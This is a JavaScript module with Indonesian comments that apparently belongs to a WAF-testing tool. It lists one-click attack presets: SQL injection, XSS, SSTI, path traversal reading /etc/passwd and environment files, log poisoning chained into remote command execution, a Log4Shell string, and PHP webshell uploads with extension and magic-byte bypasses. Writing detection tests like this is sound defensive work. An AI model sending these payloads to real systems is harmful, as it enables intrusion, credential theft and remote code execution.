/**
 * Preset vektor serangan untuk memicu deteksi WAF dengan sekali klik.
 *
 * Vektor dikelompokkan lewat `attackVectorGroups` supaya tombolnya bisa
 * ditampilkan per kategori. Sebuah vektor boleh membawa:
 *   - `path`       : path/query yang dikirim
 *   - `method`     : metode HTTP rekomendasi (GET/POST/...)
 *   - `userAgent`  : User-Agent yang dikirim
 *   - `payload`    : body request
 *   - `upload`     : spesifikasi berkas untuk unggah multipart/form-data
 *   - `advice`     : saran singkat (alasan metode, ekspektasi, langkah lanjutan)
 *
 * `upload` dipakai untuk menguji Arbitrary File Upload / webshell. Berkas
 * benar-benar dikirim sebagai `multipart/form-data` oleh proxy (lihat
 * `server/proxy.js`).
 *
 * Catatan: sebagian besar endpoint di bawah (`/upload`, dll.) hanyalah contoh.
 * Middleware WAF berjalan sebelum routing, jadi target tetap memindai permintaan
 * walau route-nya tidak ada (respons 404 pun tetap memicu/menampilkan hasil).
 * Sesuaikan path dengan route aplikasi target bila ingin pengujian end-to-end.
 */
export const attackVectorGroups = [
    {
        group: "Umum",
        items: [
            {
                label: "SSTI {{7*7}}",
                path: "/?q=%7B%7B7*7%7D%7D",
                method: "GET",
                advice: {
                    reason: "SSTI diuji lewat parameter query agar payload masuk ke rendering template.",
                    expect: '403 bila WAF mendeteksi pola template; bila lolos, cari "49" pada body.',
                },
            },
            {
                label: ".env probe",
                path: "/.env",
                method: "GET",
                advice: {
                    reason: "File sensitif diakses langsung lewat path, cukup dengan GET.",
                    expect: "403 bila diblokir; bila lolos, periksa APP_KEY / kredensial DB pada body.",
                },
            },
            {
                label: "SQLi",
                path: "/?id=1%20UNION%20SELECT%20password%20FROM%20users",
                method: "GET",
                advice: {
                    reason: "Injeksi pada parameter `id` dikirim sebagai query string.",
                    expect: "403 bila diblokir; bila lolos, cari error SQL atau hasil UNION pada body.",
                },
            },
            {
                label: "XSS",
                path: "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                method: "GET",
                advice: {
                    reason: "Reflected XSS diuji pada parameter `q`.",
                    expect: "403 bila diblokir; bila lolos, cek apakah payload ter-refleksi tanpa encoding.",
                },
            },
            {
                label: "sqlmap UA",
                path: "/",
                method: "GET",
                advice: {
                    reason: "Deteksi pemindai dari User-Agent; path apa pun cukup, jadi GET ke `/`.",
                    expect: "403 + baris `blocked_ips` dengan sumber `automatic`.",
                },
            },
        ],
    },
    {
        group: "Path Traversal / LFI",
        items: [
            {
                label: "/etc/passwd",
                path: "/../../../../etc/passwd",
                method: "GET",
                advice: {
                    reason: "Traversal dikirim pada path mentah (proxy tidak menormalisasi `../`).",
                    expect: "403 bila diblokir; bila lolos, body berisi `root:x:0:0:`.",
                },
            },
            {
                label: "Nested traversal",
                path: "/?file=....//....//....//....//etc/passwd",
                method: "GET",
                advice: {
                    reason: "Bypass filter traversal naif memakai pola `....//`.",
                    expect: "403 atau 400; cek apakah filter membiarkan pola bersarang.",
                },
            },
            {
                label: "php://filter (base64)",
                path: "/?file=php://filter/convert.base64-encode/resource=index.php",
                method: "GET",
                advice: {
                    reason: "Wrapper PHP untuk membaca source tanpa eksekusi, via parameter `file`.",
                    expect: "403 bila diblokir; bila lolos, body berisi base64 source PHP.",
                },
            },
            {
                label: "/proc/self/environ",
                path: "/?file=../../../../proc/self/environ",
                method: "GET",
                advice: {
                    reason: "Membaca environment proses; kadang memuat kredensial.",
                    expect: "403 bila diblokir; bila lolos, cari variabel rahasia pada body.",
                },
            },
            {
                label: "Windows win.ini",
                path: "/../../../../windows/win.ini",
                method: "GET",
                advice: {
                    reason: "Uji traversal lintas-platform (target Windows).",
                    expect: "403 bila diblokir; bila lolos, body berisi `[fonts]`.",
                },
            },
            {
                label: "Null byte LFI",
                path: "/?file=../../../../etc/passwd%00",
                method: "GET",
                advice: {
                    reason: "Uji bypass validasi ekstensi memakai null byte.",
                    expect: "403 atau 400; sebagian runtime modern menolak null byte.",
                },
            },
            {
                label: "Laravel log file",
                path: "/?file=../../../../storage/logs/laravel.log",
                method: "GET",
                advice: {
                    reason: "Menargetkan log Laravel — bahan utama langkah log poisoning berikutnya.",
                    expect: "403 bila diblokir; bila lolos, body berisi isi log aplikasi.",
                },
            },
        ],
    },
    {
        group: "Log Poisoning → RCE",
        items: [
            {
                label: "① Poison via UA",
                path: "/",
                method: "GET",
                userAgent: '<?php system($_GET["c"]); ?>',
                advice: {
                    reason: "Payload PHP ditulis ke access log lewat User-Agent; GET cukup karena UA selalu tercatat.",
                    expect: "403 bila WAF memindai UA; bila lolos, payload tertulis di log server.",
                    steps: [
                        "Kirim dengan IP acak baru.",
                        "Lanjut ke vektor ② untuk meng-include berkas log.",
                    ],
                },
            },
            {
                label: "① Log4Shell UA",
                path: "/",
                method: "GET",
                userAgent: "${jndi:ldap://127.0.0.1:1389/a}",
                advice: {
                    reason: "Uji deteksi JNDI/log4j pada User-Agent.",
                    expect: "403 bila diblokir; bila lolos, cek outbound LDAP dari server target.",
                },
            },
            {
                label: "② Apache log + cmd",
                path: "/?file=../../../../var/log/apache2/access.log&c=id",
                method: "GET",
                advice: {
                    reason: "LFI meng-include access log Apache + parameter `c` untuk eksekusi perintah.",
                    expect: "403 bila diblokir; bila lolos, cari `uid=` (hasil `id`) pada body.",
                    steps: [
                        "Jalankan vektor ① terlebih dahulu.",
                        "Sesuaikan path log dengan server target (Apache).",
                    ],
                },
            },
            {
                label: "② Nginx log + cmd",
                path: "/?file=../../../../var/log/nginx/access.log&c=id",
                method: "GET",
                advice: {
                    reason: "Sama seperti Apache, namun menargetkan access log Nginx.",
                    expect: "403 bila diblokir; bila lolos, cari `uid=` pada body.",
                    steps: [
                        "Jalankan vektor ① terlebih dahulu.",
                        "Sesuaikan path log dengan server target (Nginx).",
                    ],
                },
            },
            {
                label: "② Laravel log + cmd",
                path: "/?file=../../../../storage/logs/laravel.log&c=id",
                method: "GET",
                advice: {
                    reason: "Meng-include log Laravel; berguna bila target tidak memakai access log web server.",
                    expect: "403 bila diblokir; bila lolos, cari `uid=` pada body.",
                    steps: [
                        "Jalankan vektor ① terlebih dahulu.",
                        "Pastikan isi log memuat payload dari User-Agent.",
                    ],
                },
            },
        ],
    },
    {
        group: "File Upload / Webshell",
        items: [
            {
                label: "PHP webshell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.php",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "application/x-php",
                },
                advice: {
                    reason: "Unggah berkas wajib `multipart/form-data`, jadi metode otomatis POST.",
                    expect: "403 bila diblokir; bila lolos, berkas tersimpan dan bisa dipanggil.",
                    steps: [
                        "Sesuaikan path dengan route unggah target.",
                        "Bila berhasil, akses `/uploads/shell.php?cmd=id`.",
                    ],
                },
            },
            {
                label: "PHTML shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.phtml",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "application/x-php",
                },
                advice: {
                    reason: "Alternatif ekstensi `.phtml` bila `.php` difilter, tetap POST multipart.",
                    expect: "403 bila diblokir; bila lolos, cek apakah `.phtml` dieksekusi.",
                },
            },
            {
                label: "PHAR shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.phar",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "application/x-php",
                },
                advice: {
                    reason: "Ekstensi `.phar` sering lolos dari allowlist ekstensi yang naif.",
                    expect: "403 bila diblokir; bila lolos, uji akses atau pemicu deserialisasi PHAR.",
                },
            },
            {
                label: "Double extension",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.php.jpg",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "image/jpeg",
                },
                advice: {
                    reason: "Uji validasi ekstensi naif; tipe MIME di-spoof menjadi image/jpeg.",
                    expect: "403 bila diblokir; bila lolos, uji apakah `.php.jpg` dieksekusi.",
                },
            },
            {
                label: "GIF magic shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.php",
                    content: 'GIF89a<?php system($_GET["cmd"]); ?>',
                    content_type: "image/gif",
                },
                advice: {
                    reason: "Bypass pemeriksaan magic bytes dengan menambah header `GIF89a`.",
                    expect: "403 bila diblokir; bila lolos, berkas lolos validasi gambar.",
                },
            },
            {
                label: ".htaccess override",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: ".htaccess",
                    content: "AddType application/x-httpd-php .jpg",
                    content_type: "text/plain",
                },
                advice: {
                    reason: "Mengubah handler PHP agar `.jpg` dieksekusi; tetap POST multipart.",
                    expect: "403 bila diblokir; bila lolos, unggah gambar berisi PHP lalu akses.",
                    steps: [
                        "Unggah `.htaccess` ini lebih dulu.",
                        "Lalu unggah berkas `.jpg` yang berisi kode PHP.",
                    ],
                },
            },
            {
                label: "SVG XSS",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "x.svg",
                    content:
                        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
                    content_type: "image/svg+xml",
                },
                advice: {
                    reason: "SVG bisa memuat script; uji stored XSS lewat berkas, POST multipart.",
                    expect: "403 bila diblokir; bila lolos, buka berkas untuk memicu `onload`.",
                },
            },
        ],
    },
];

/**
 * Daftar datar seluruh vektor (dipakai bila tidak butuh pengelompokan).
 */
export const attackVectors = attackVectorGroups.flatMap((entry) => entry.items);

/**
 * Menentukan metode HTTP paling tepat untuk sebuah vektor:
 * unggah berkas atau body wajib POST, sisanya GET.
 */
export function recommendedMethod(vector) {
    if (vector.method) {
        return vector.method;
    }

    if (vector.upload || vector.payload) {
        return "POST";
    }

    return "GET";
}

/**
 * Preset User-Agent untuk menguji deteksi pemindai kerentanan sekaligus
 * menyuntikkan payload tertulis ke berkas log (log poisoning).
 */
export const userAgentPresets = [
    {
        label: "Browser",
        value: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    },
    { label: "sqlmap", value: "sqlmap/1.7.2#stable (http://sqlmap.org)" },
    {
        label: "Nikto",
        value: "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)",
    },
    { label: "curl", value: "curl/8.7.1" },
    { label: "Log poison PHP", value: '<?php system($_GET["c"]); ?>' },
    { label: "Log4Shell JNDI", value: "${jndi:ldap://127.0.0.1:1389/a}" },
];
